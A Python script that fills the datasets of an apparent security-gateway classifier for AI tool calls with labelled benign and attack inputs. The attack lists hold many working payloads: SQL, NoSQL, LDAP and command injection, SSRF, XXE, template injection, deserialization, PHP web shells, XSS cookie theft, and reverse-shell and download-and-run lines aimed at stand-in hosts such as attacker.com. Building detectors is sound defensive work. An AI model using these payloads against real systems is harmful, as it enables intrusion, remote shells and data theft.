#!/usr/bin/env python3
"""
Script to update MCP Security Gateway datasets with real-world attack payloads
from OWASP ModSecurity CRS and PayloadsAllTheThings.

Converts datasets to BINARY classification format: benign vs attack
"""

import json
from pathlib import Path


def convert_to_binary(dataset: dict) -> dict:
    """Convert 3-class dataset (benign/sensitive/malicious) to binary (benign/attack)."""
    binary_dataset = {}
    for tool_name, categories in dataset.items():
        binary_dataset[tool_name] = {
            "benign": categories.get("benign", []),
            "attack": []
        }
        # Merge sensitive and malicious into attack
        if "sensitive" in categories:
            binary_dataset[tool_name]["attack"].extend(categories["sensitive"])
        if "malicious" in categories:
            binary_dataset[tool_name]["attack"].extend(categories["malicious"])
        # Deduplicate
        binary_dataset[tool_name]["attack"] = list(set(binary_dataset[tool_name]["attack"]))
        binary_dataset[tool_name]["benign"] = list(set(binary_dataset[tool_name]["benign"]))
    return binary_dataset


def main():
    data_dir = Path(__file__).parent.parent / 'data'

    # Load existing datasets
    with open(data_dir / 'training_dataset.json', 'r', encoding='utf-8') as f:
        train = json.load(f)

    # Try to load test dataset
    try:
        with open(data_dir / 'test_dataset.json', 'r', encoding='utf-8') as f:
            content = f.read().strip()
            test = json.loads(content) if content else {}
    except (json.JSONDecodeError, FileNotFoundError):
        test = {}

    # ============================================================
    # NEW MALICIOUS PAYLOADS FOR TRAINING DATASET
    # From PayloadsAllTheThings
    # ============================================================

    # Path Traversal - Advanced encoding bypasses
    new_path_traversal = [
        # Double URL encoding
        "{\"path\": \"%252e%252e%252f%252e%252e%252fetc%252fpasswd\"}",
        "{\"path\": \"%252e%252e%255c%252e%252e%255cwindows%255cwin.ini\"}",
        # Overlong UTF-8 encoding
        "{\"path\": \"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd\"}",
        "{\"path\": \"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\"}",
        # Unicode normalization bypass
        "{\"path\": \"..%u2215..%u2215..%u2215etc/passwd\"}",
        "{\"path\": \"..%u2216..%u2216windows%u2216win.ini\"}",
        # Mangled path bypass
        "{\"path\": \"..././..././..././etc/passwd\"}",
        "{\"path\": \"....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\\\\\win.ini\"}",
        # Reverse proxy bypass (NGINX/Tomcat)
        "{\"path\": \"..;/..;/..;/etc/passwd\"}",
        "{\"path\": \";/../../../etc/passwd\"}",
        # NULL byte injection (legacy)
        "{\"path\": \"../../../etc/passwd%00.jpg\"}",
        "{\"path\": \"..%00/..%00/..%00/etc/passwd\"}",
    ]

    # SSRF - Advanced IP obfuscation from PayloadsAllTheThings
    new_ssrf = [
        # Decimal IP encoding
        "{\"url\": \"http://2130706433/admin\"}",  # 127.0.0.1
        "{\"url\": \"http://2852039166/latest/meta-data/\"}",  # 169.254.169.254
        "{\"url\": \"http://3232235521/internal\"}",  # 192.168.0.1
        # Octal IP encoding
        "{\"url\": \"http://0177.0.0.1/admin\"}",
        "{\"url\": \"http://0o177.0.0.1/secret\"}",
        "{\"url\": \"http://0177.0000.0000.0001/\"}",
        # Hex IP encoding
        "{\"url\": \"http://0x7f000001/admin\"}",
        "{\"url\": \"http://0xa9fea9fe/latest/meta-data/\"}",
        "{\"url\": \"http://0x7f.0x00.0x00.0x01/secret\"}",
        # IPv6 techniques
        "{\"url\": \"http://[0:0:0:0:0:ffff:127.0.0.1]/admin\"}",
        "{\"url\": \"http://[::ffff:7f00:1]/secret\"}",
        "{\"url\": \"http://[0000::1]/internal\"}",
        # DNS rebinding services
        "{\"url\": \"http://127.0.0.1.nip.io/admin\"}",
        "{\"url\": \"http://localtest.me/secret\"}",
        "{\"url\": \"http://169.254.169.254.xip.io/meta-data/\"}",
        "{\"url\": \"http://make-127.0.0.1-rebind-169.254.169.254.1u.ms/\"}",
        # URL parsing discrepancies
        "{\"url\": \"http://127.1.1.1:80\\\\@127.2.2.2:80/admin\"}",
        "{\"url\": \"http://attacker.com@127.0.0.1/secret\"}",
        "{\"url\": \"http://127.0.0.1#@evil.com/admin\"}",
        # Alternative protocols
        "{\"url\": \"gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>\"}",
        "{\"url\": \"dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/tmp\"}",
        "{\"url\": \"sftp://attacker.com:22/etc/passwd\"}",
        "{\"url\": \"tftp://attacker.com/shell.sh\"}",
        "{\"url\": \"ldap://attacker.com/o=ref\"}",
    ]

    # SQL Injection - Advanced techniques
    new_sqli = [
        # Time-based blind SQLi
        "{\"query\": \"SELECT * FROM users WHERE id=1; WAITFOR DELAY '0:0:10'--\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND SLEEP(10)--\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND pg_sleep(10)--\"}",
        # Error-based SQLi
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND EXP(~(SELECT * FROM (SELECT password)x))\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1 AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))\"}",
        # Out-of-band SQLi
        "{\"query\": \"SELECT * FROM users WHERE id=1; DECLARE @q VARCHAR(99);SET @q='\\\\\\\\\\\\\\\\attacker.com\\\\\\\\x';EXEC master.dbo.xp_dirtree @q--\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=(SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM dual)\"}",
        # Comment bypass
        "{\"query\": \"SELECT * FROM users WHERE id=1/**/OR/**/1=1--\"}",
        "{\"query\": \"SELECT/*!50000*/password/*!50000*/FROM/*!50000*/users\"}",
        "{\"query\": \"SELECT * FROM users WHERE id=1%0AOR%0A1=1--\"}",
        # Stacked queries
        "{\"query\": \"SELECT 1,2,3,4 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[c]);?>'\"}",
        "{\"query\": \"SELECT * FROM users; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh|sh'\"}",
    ]

    # NoSQL Injection - MongoDB operators
    new_nosqli = [
        "{\"query\": \"{\\\"username\\\": {\\\"$ne\\\": null}, \\\"password\\\": {\\\"$ne\\\": null}}\"}",
        "{\"query\": \"{\\\"username\\\": {\\\"$gt\\\": \\\"\\\"}, \\\"password\\\": {\\\"$gt\\\": \\\"\\\"}}\"}",
        "{\"query\": \"{\\\"username\\\": {\\\"$regex\\\": \\\"^admin\\\"}, \\\"password\\\": {\\\"$ne\\\": \\\"\\\"}}\"}",
        "{\"query\": \"{\\\"$where\\\": \\\"this.password.match(/.*/)\\\"}\"}",
        "{\"query\": \"{\\\"username\\\": {\\\"$in\\\": [\\\"admin\\\", \\\"root\\\"]}, \\\"password\\\": {\\\"$exists\\\": true}}\"}",
        "{\"query\": \"username[$ne]=admin&password[$regex]=.*\"}",
        "{\"query\": \"{\\\"$or\\\": [{}, {\\\"a\\\": \\\"a\\\"}]}\"}",
    ]

    # XXE Injection payloads
    new_xxe = [
        "{\"content\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\"}",
        "{\"content\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><data>&xxe;</data>\"}",
        "{\"content\": \"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>\"}",
        "{\"content\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]><root></root>\"}",
        "{\"content\": \"<!DOCTYPE test [<!ENTITY % init SYSTEM 'data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk'>%init;]>\"}",
    ]

    # SSTI payloads for various template engines
    new_ssti = [
        # Jinja2/Flask
        "{\"content\": \"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"}",
        "{\"content\": \"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}\"}",
        "{\"content\": \"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\"}",
        # Twig
        "{\"content\": \"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\"}",
        # FreeMarker
        "{\"content\": \"<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"id\\\")}\"}",
        "{\"content\": \"${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"id\\\")}\"}",
        # Velocity
        "{\"content\": \"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt.getRuntime().exec('id')\"}",
        # Polyglot
        "{\"content\": \"${{<%[%'\\\"}}%\\\\.\"}",
    ]

    # Deserialization payloads
    new_deser = [
        # Python pickle
        "{\"data\": \"gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==\"}",
        "{\"script\": \"import pickle,base64;exec(pickle.loads(base64.b64decode('Y29zCnN5c3RlbQooUydpZCcKdFIu')))\", \"language\": \"python\"}",
        # YAML deserialization
        "{\"config\": \"!!python/object/apply:os.system ['id']\"}",
        "{\"config\": \"!!python/object/new:subprocess.check_output [['id']]\"}",
    ]

    # Add new payloads to training dataset
    if 'read_file' in train:
        train['read_file']['malicious'].extend(new_path_traversal)

    if 'fetch_url' in train:
        train['fetch_url']['malicious'].extend(new_ssrf)

    if 'read_query' in train:
        train['read_query']['malicious'].extend(new_sqli)
        train['read_query']['malicious'].extend(new_nosqli)

    if 'write_file' in train:
        train['write_file']['malicious'].extend(new_xxe)
        train['write_file']['malicious'].extend(new_ssti)

    if 'run_script' in train:
        train['run_script']['malicious'].extend(new_deser)

    # ============================================================
    # NEW TOOLS FOR TEST DATASET (ZERO-DAY DETECTION)
    # These are COMPLETELY NEW tool types not in training
    # ============================================================

    # GraphQL query tool - NEW tool type
    test['graphql_query'] = {
        "benign": [
            "{\"query\": \"query { user(id: 1) { name email } }\"}",
            "{\"query\": \"query { products(first: 10) { edges { node { name price } } } }\"}",
            "{\"query\": \"mutation { createPost(title: \\\"Test\\\") { id } }\"}",
            "{\"query\": \"query { orders(status: PENDING) { id total } }\"}",
            "{\"query\": \"{ __typename }\"}",
            "{\"query\": \"query GetUser($id: ID!) { user(id: $id) { name } }\", \"variables\": {\"id\": \"123\"}}"
        ],
        "sensitive": [
            "{\"query\": \"query { users { email passwordHash } }\"}",
            "{\"query\": \"query { admin { apiKey secretToken } }\"}",
            "{\"query\": \"query { auditLogs { action userId ipAddress } }\"}"
        ],
        "malicious": [
            "{\"query\": \"query { __schema { types { name fields { name } } } }\"}",
            "{\"query\": \"query { __type(name: \\\"User\\\") { fields { name type { name } } } }\"}",
            "{\"query\": \"mutation { deleteAllUsers { count } }\"}",
            "{\"query\": \"{\\\"query\\\": \\\"query { user(id: \\\\\\\"1 OR 1=1\\\\\\\") { name } }\\\"}\"}",
            "{\"query\": \"query x($id: String!) { user(id: $id) { name } }\", \"variables\": {\"id\": \"1; DROP TABLE users--\"}}",
            "{\"query\": \"query { users(first: 999999999) { edges { node { id } } } }\"}",
            "{\"query\": \"query { a]};alert(1)// }\"}"
        ]
    }

    # LDAP query tool - NEW tool type
    test['ldap_query'] = {
        "benign": [
            "{\"filter\": \"(uid=john)\", \"base\": \"ou=users,dc=example,dc=com\"}",
            "{\"filter\": \"(objectClass=person)\", \"base\": \"dc=example,dc=com\"}",
            "{\"filter\": \"(&(department=IT)(active=true))\", \"base\": \"ou=employees,dc=corp,dc=net\"}",
            "{\"filter\": \"(cn=John Doe)\", \"base\": \"ou=contacts,dc=example,dc=com\"}",
            "{\"filter\": \"(mail=*@example.com)\", \"base\": \"ou=users,dc=example,dc=com\"}"
        ],
        "sensitive": [
            "{\"filter\": \"(objectClass=*)\", \"base\": \"cn=admin,dc=example,dc=com\"}",
            "{\"filter\": \"(uid=admin)\", \"base\": \"ou=admins,dc=corp,dc=net\"}",
            "{\"filter\": \"(memberOf=cn=Domain Admins)\", \"base\": \"dc=example,dc=com\"}"
        ],
        "malicious": [
            "{\"filter\": \"*)(uid=*))(|(uid=*\", \"base\": \"dc=example,dc=com\"}",
            "{\"filter\": \"admin)(|(password=*)\", \"base\": \"ou=users,dc=example,dc=com\"}",
            "{\"filter\": \")(cn=*)(|(cn=*\", \"base\": \"dc=corp,dc=net\"}",
            "{\"filter\": \"*)(objectClass=*\", \"base\": \"dc=example,dc=com\"}",
            "{\"filter\": \"\\\\00*)(uid=admin\", \"base\": \"ou=users,dc=example,dc=com\"}",
            "{\"filter\": \"*)(|(objectClass=*))\", \"base\": \"dc=corp,dc=net\"}"
        ]
    }

    # XML parser tool - NEW tool type
    test['parse_xml'] = {
        "benign": [
            "{\"xml\": \"<?xml version=\\\"1.0\\\"?><data><item>test</item></data>\"}",
            "{\"xml\": \"<config><setting name=\\\"debug\\\">false</setting></config>\"}",
            "{\"xml\": \"<users><user id=\\\"1\\\"><name>John</name></user></users>\"}",
            "{\"xml\": \"<response status=\\\"ok\\\"><message>Success</message></response>\"}",
            "{\"xml\": \"<feed><entry><title>Hello</title></entry></feed>\"}"
        ],
        "sensitive": [
            "{\"xml\": \"<credentials><username>admin</username><password>secret</password></credentials>\"}",
            "{\"xml\": \"<config><apiKey>sk-xxx</apiKey></config>\"}"
        ],
        "malicious": [
            "{\"xml\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\"}",
            "{\"xml\": \"<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;%send;]><root></root>\"}",
            "{\"xml\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><data>&xxe;</data>\"}",
            "{\"xml\": \"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><test>&xxe;</test>\"}",
            "{\"xml\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % def '<!ENTITY send SYSTEM \\\"http://attacker.com/?data=%xxe;\\\">'>%def;]><foo>&send;</foo>\"}",
            "{\"xml\": \"<!DOCTYPE :[ <!ENTITY x SYSTEM \\\"file:///dev/random\\\"> ]><x>&x;</x>\"}"
        ]
    }

    # Redis command tool - NEW tool type
    test['redis_command'] = {
        "benign": [
            "{\"command\": \"GET\", \"args\": [\"session:123\"]}",
            "{\"command\": \"SET\", \"args\": [\"cache:page\", \"data\"]}",
            "{\"command\": \"HGET\", \"args\": [\"user:1\", \"name\"]}",
            "{\"command\": \"LPUSH\", \"args\": [\"queue\", \"task1\"]}",
            "{\"command\": \"EXPIRE\", \"args\": [\"cache:key\", \"3600\"]}"
        ],
        "sensitive": [
            "{\"command\": \"KEYS\", \"args\": [\"*\"]}",
            "{\"command\": \"CONFIG\", \"args\": [\"GET\", \"requirepass\"]}",
            "{\"command\": \"INFO\", \"args\": []}"
        ],
        "malicious": [
            "{\"command\": \"CONFIG\", \"args\": [\"SET\", \"dir\", \"/var/www/html\"]}",
            "{\"command\": \"CONFIG\", \"args\": [\"SET\", \"dbfilename\", \"shell.php\"]}",
            "{\"command\": \"EVAL\", \"args\": [\"return os.execute('id')\", \"0\"]}",
            "{\"command\": \"SLAVEOF\", \"args\": [\"attacker.com\", \"6379\"]}",
            "{\"command\": \"MODULE\", \"args\": [\"LOAD\", \"/tmp/malicious.so\"]}",
            "{\"command\": \"DEBUG\", \"args\": [\"SEGFAULT\"]}",
            "{\"command\": \"FLUSHALL\", \"args\": []}"
        ]
    }

    # JWT token tool - NEW tool type
    test['verify_jwt'] = {
        "benign": [
            "{\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\"}",
            "{\"token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2VyMSJ9.signature\"}",
            "{\"token\": \"eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig\"}"
        ],
        "sensitive": [
            "{\"token\": \"eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret\"}",
            "{\"token\": \"eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig\"}"
        ],
        "malicious": [
            "{\"token\": \"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.\"}",
            "{\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYWRtaW4ifQ.sig\"}",
            "{\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiYXR0YWNrZXJfa2V5In19.eyJyb2xlIjoiYWRtaW4ifQ.sig\"}",
            "{\"token\": \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig\", \"key\": \"file:///etc/passwd\"}",
            "{\"token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig\"}"
        ]
    }

    # S3/Cloud storage tool - NEW tool type
    test['s3_operation'] = {
        "benign": [
            "{\"operation\": \"get\", \"bucket\": \"my-app-data\", \"key\": \"uploads/file.pdf\"}",
            "{\"operation\": \"put\", \"bucket\": \"backups\", \"key\": \"2024/backup.sql\"}",
            "{\"operation\": \"list\", \"bucket\": \"assets\", \"prefix\": \"images/\"}",
            "{\"operation\": \"delete\", \"bucket\": \"temp\", \"key\": \"cache/old.json\"}"
        ],
        "sensitive": [
            "{\"operation\": \"get\", \"bucket\": \"company-secrets\", \"key\": \"credentials.json\"}",
            "{\"operation\": \"list\", \"bucket\": \"audit-logs\", \"prefix\": \"\"}",
            "{\"operation\": \"get\", \"bucket\": \"hr-data\", \"key\": \"employee-ssn.csv\"}"
        ],
        "malicious": [
            "{\"operation\": \"get\", \"bucket\": \"../../../../etc\", \"key\": \"passwd\"}",
            "{\"operation\": \"put\", \"bucket\": \"public-bucket\", \"key\": \"shell.php\", \"content\": \"<?php system($_GET['c']); ?>\"}",
            "{\"operation\": \"get\", \"bucket\": \"http://169.254.169.254/latest/meta-data\", \"key\": \"iam/\"}",
            "{\"operation\": \"list\", \"bucket\": \"`curl attacker.com`\", \"prefix\": \"\"}",
            "{\"operation\": \"copy\", \"source\": \"s3://victim-bucket/secrets\", \"dest\": \"s3://attacker-bucket/stolen\"}"
        ]
    }

    # Webhook/HTTP callback tool - NEW tool type
    test['send_webhook'] = {
        "benign": [
            "{\"url\": \"https://hooks.slack.com/services/xxx/yyy/zzz\", \"payload\": {\"text\": \"Alert\"}}",
            "{\"url\": \"https://api.github.com/repos/owner/repo/dispatches\", \"payload\": {\"event_type\": \"deploy\"}}",
            "{\"url\": \"https://webhook.site/unique-id\", \"payload\": {\"test\": true}}"
        ],
        "sensitive": [
            "{\"url\": \"https://internal.corp.net/webhook\", \"payload\": {\"token\": \"xxx\"}}",
            "{\"url\": \"https://admin-api.company.com/notify\", \"payload\": {\"secret\": \"yyy\"}}"
        ],
        "malicious": [
            "{\"url\": \"http://127.0.0.1:9200/_search\", \"payload\": {\"query\": {\"match_all\": {}}}}",
            "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", \"payload\": {}}",
            "{\"url\": \"http://localhost:6379/\", \"payload\": \"*1\\r\\n$8\\r\\nFLUSHALL\\r\\n\"}",
            "{\"url\": \"gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>\", \"payload\": {}}",
            "{\"url\": \"file:///etc/passwd\", \"payload\": {}}",
            "{\"url\": \"http://2852039166/latest/meta-data/\", \"payload\": {}}"
        ]
    }

    # Template rendering tool - NEW tool type
    test['render_template'] = {
        "benign": [
            "{\"template\": \"Hello, {{name}}!\", \"data\": {\"name\": \"John\"}}",
            "{\"template\": \"Order #{{order_id}} - Total: ${{total}}\", \"data\": {\"order_id\": 123, \"total\": 99.99}}",
            "{\"template\": \"<h1>{{title}}</h1><p>{{content}}</p>\", \"data\": {\"title\": \"Welcome\", \"content\": \"Hello world\"}}",
            "{\"template\": \"Date: {% now 'Y-m-d' %}\", \"data\": {}}"
        ],
        "sensitive": [
            "{\"template\": \"API Key: {{api_key}}\", \"data\": {\"api_key\": \"sk-xxx\"}}",
            "{\"template\": \"Password: {{password}}\", \"data\": {\"password\": \"secret\"}}"
        ],
        "malicious": [
            "{\"template\": \"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\", \"data\": {}}",
            "{\"template\": \"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}\", \"data\": {}}",
            "{\"template\": \"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\", \"data\": {}}",
            "{\"template\": \"${T(java.lang.Runtime).getRuntime().exec('id')}\", \"data\": {}}",
            "{\"template\": \"${{<%[%'\\\"}}%\\\\.\", \"data\": {}}",
            "{\"template\": \"{{constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')}}\", \"data\": {}}"
        ]
    }

    # Serialization tool - NEW tool type
    test['deserialize_data'] = {
        "benign": [
            "{\"format\": \"json\", \"data\": \"{\\\"name\\\": \\\"test\\\"}\"}",
            "{\"format\": \"yaml\", \"data\": \"name: test\\nvalue: 123\"}",
            "{\"format\": \"xml\", \"data\": \"<data><item>test</item></data>\"}",
            "{\"format\": \"msgpack\", \"data\": \"base64_encoded_msgpack\"}"
        ],
        "sensitive": [
            "{\"format\": \"json\", \"data\": \"{\\\"credentials\\\": {\\\"key\\\": \\\"secret\\\"}}\"}",
            "{\"format\": \"yaml\", \"data\": \"api_key: sk-xxx\"}"
        ],
        "malicious": [
            "{\"format\": \"pickle\", \"data\": \"gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==\"}",
            "{\"format\": \"yaml\", \"data\": \"!!python/object/apply:os.system ['id']\"}",
            "{\"format\": \"yaml\", \"data\": \"!!python/object/new:subprocess.check_output [['cat', '/etc/passwd']]\"}",
            "{\"format\": \"java\", \"data\": \"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==\"}",
            "{\"format\": \"php\", \"data\": \"O:8:\\\"stdClass\\\":1:{s:4:\\\"evil\\\";s:20:\\\"system('id');\\\"}\"}",
            "{\"format\": \"ruby\", \"data\": \"!ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source uri: |\\n      `id`\"}"
        ]
    }

    # ============================================================
    # ADDITIONAL REAL-WORLD ATTACK PAYLOADS (OWASP CRS + PayloadsAllTheThings)
    # ============================================================

    # SQL Injection payloads from PayloadsAllTheThings Auth Bypass
    sql_auth_bypass = [
        "' or ''='",
        '" or ""="',
        "or true--",
        '" or true--',
        "' or true--",
        '") or true--',
        "') or true--",
        "' or 'x'='x",
        "') or ('x')=('x",
        '")) or (("x"))=(("x',
        '" or "x"="x',
        '") or ("x")=("x',
        "or 1=1",
        "or 1=1--",
        "or 1=1#",
        "or 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin' or 1=1",
        "admin') or ('1'='1",
        'admin") or ("1"="1',
        "1' or 1.e(1) or '1'='1",
    ]

    # Command Injection payloads from PayloadsAllTheThings
    cmd_injection = [
        "/bin/cat /etc/passwd",
        "/bin/cat /etc/shadow",
        "/usr/bin/id",
        "/bin/ls -al",
        "id", "whoami", "uname -a",
        ";id;", "|id|", "||/usr/bin/id|", ";id|",
        "\\nid\\n",
        "`id`", "`whoami`", "`cat /etc/passwd`",
        "$(id)", "$(whoami)", "$(cat /etc/passwd)",
        "ping -i 30 127.0.0.1",
        "ping -n 30 127.0.0.1",
        "system('cat /etc/passwd')",
        "system('id')",
        "& id", "; id", "| id",
        "$;/usr/bin/id",
        # OWASP CRS evasion patterns
        "c'at'/etc/passwd",
        "c$@at /etc/passwd",
        "ca\\t /etc/passwd",
        "/s?in/ifconfig",
        "/s[a-b]in/ifconfig",
        "{,ifconfig}", "{l,-lh}s",
        "curl http://evil.com/shell.sh | bash",
        "wget http://evil.com/backdoor -O /tmp/bd",
        "nc -e /bin/sh attacker.com 4444",
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    ]

    # Path Traversal payloads with exotic encodings
    path_traversal_exotic = [
        # Double URL encoding
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
        # UTF-8 overlong encoding
        "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        # Unicode normalization
        "..%u2215..%u2215..%u2215etc/passwd",
        "..%u2216..%u2216windows%u2216win.ini",
        # Mangled path
        "..././..././..././etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        # Reverse proxy bypass
        "..;/..;/..;/etc/passwd",
        ";/../../../etc/passwd",
        # NULL byte injection
        "../../../etc/passwd%00.jpg",
        "..%00/..%00/..%00/etc/passwd",
    ]

    # XSS payloads from OWASP CRS
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<img src=x onerror=fetch(`http://evil.com?c=${document.cookie}`)>",
        "{{constructor.constructor('alert(1)')()}}",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    ]

    # SSRF payloads from OWASP CRS
    ssrf_payloads = [
        "http://2130706433/admin",
        "http://2852039166/latest/meta-data/",
        "http://0177.0.0.1/admin",
        "http://0x7f000001/admin",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/admin",
        "http://[::ffff:7f00:1]/secret",
        "http://127.0.0.1.nip.io/admin",
        "http://localtest.me/admin",
        "http://attacker.com@127.0.0.1/admin",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
        "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/tmp",
        "file:///etc/passwd",
    ]

    # Add additional payloads to existing tools
    for tool in ['read_query', 'write_query']:
        if tool in train and 'malicious' in train[tool]:
            for payload in sql_auth_bypass:
                train[tool]['malicious'].append(f'{{"query": "{payload}"}}')

    for tool in ['get_current_time', 'convert_time', 'execute_command', 'run_script']:
        if tool in train and 'malicious' in train[tool]:
            for payload in cmd_injection[:15]:
                train[tool]['malicious'].append(f'{{"timezone": "{payload}"}}' if 'time' in tool else f'{{"command": "{payload}"}}')

    for tool in ['read_file', 'write_file', 'list_directory', 'get_file_info', 'check_file_exists']:
        if tool in train and 'malicious' in train[tool]:
            for payload in path_traversal_exotic:
                train[tool]['malicious'].append(f'{{"path": "{payload}"}}')

    for tool in ['fetch_url', 'fetch_html', 'check_url']:
        if tool in train and 'malicious' in train[tool]:
            for payload in ssrf_payloads:
                train[tool]['malicious'].append(f'{{"url": "{payload}"}}')

    for tool in ['create_entity', 'search_entities']:
        if tool in train and 'malicious' in train[tool]:
            for payload in xss_payloads[:5]:
                escaped = payload.replace('"', '\\"')
                train[tool]['malicious'].append(f'{{"name": "{escaped}", "content": "test"}}')

    # ============================================================
    # CONVERT TO BINARY CLASSIFICATION (benign vs attack)
    # ============================================================
    print("Converting to binary classification format...")
    train = convert_to_binary(train)
    test = convert_to_binary(test)

    # Save updated datasets
    with open(data_dir / 'training_dataset.json', 'w', encoding='utf-8') as f:
        json.dump(train, f, indent=2, ensure_ascii=False)

    with open(data_dir / 'test_dataset.json', 'w', encoding='utf-8') as f:
        json.dump(test, f, indent=2, ensure_ascii=False)

    # Also update validation dataset if it exists
    try:
        with open(data_dir / 'validation_dataset.json', 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if content:
                validation = json.loads(content)
                validation = convert_to_binary(validation)
                with open(data_dir / 'validation_dataset.json', 'w', encoding='utf-8') as f:
                    json.dump(validation, f, indent=2, ensure_ascii=False)
                print("Updated validation_dataset.json")
    except (json.JSONDecodeError, FileNotFoundError):
        pass

    print("=" * 60)
    print("DATASET UPDATE COMPLETE - BINARY CLASSIFICATION")
    print("=" * 60)

    # Count samples
    train_count = sum(len(v.get('benign', [])) + len(v.get('attack', []))
                      for v in train.values())
    test_count = sum(len(v.get('benign', [])) + len(v.get('attack', []))
